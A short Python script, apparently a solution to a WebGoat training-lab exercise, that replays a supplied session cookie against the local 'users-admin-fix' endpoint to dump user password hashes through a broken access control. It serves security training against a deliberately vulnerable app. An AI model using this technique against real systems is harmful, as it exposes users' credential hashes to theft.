import requests
import sys

try:
   #Assign script parameters to variables
   sessionID = sys.argv[1]
   #Define request headers
   headers = {
		 'Accept': '*/*',
		 'Accept-Encoding':'gzip, deflate, br',
		 'Accept-Language':'en-US,en;q=0.5',
		 'Connection':'keep-alive',
		 'Content-Type':'application/json',
		 'Cookie':'JSESSIONID='+str(sessionID),
		 'Origin':'http://localhost:8080',
		 'Referer':'http://localhost:8080/WebGoat/start.mvc',
		 'Sec-Fetch-Dest':'empty',
		 'Sec-Fetch-Mode':'cors',
		 'Sec-Fetch-Site':'same-origin',
		 'User-Agent':'any',
		 'X-Requested-With':'XMLHttpRequest',
      }
   #Send get request to pull the user hashes using admin fix URL
   response = requests.get('http://localhost:8080/WebGoat/access-control/users-admin-fix',timeout=5, headers=headers)
   data = response.json()
   print(data)

except Exception as error:
  print("An exception occured:", error)
